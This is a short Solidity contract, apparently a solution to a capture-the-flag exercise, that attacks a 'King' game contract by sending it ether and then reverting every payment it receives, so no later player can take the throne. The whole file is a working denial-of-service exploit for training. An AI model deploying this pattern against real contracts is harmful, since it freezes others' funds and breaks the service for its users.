// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // transfer won't work because transfer only lets 2,300 gas ahead, which is not enough for the King receive function.
        contractAddress.call{value: 2 ether}("");
    }

    receive() external payable {
        revert("DDosed");
    }
}
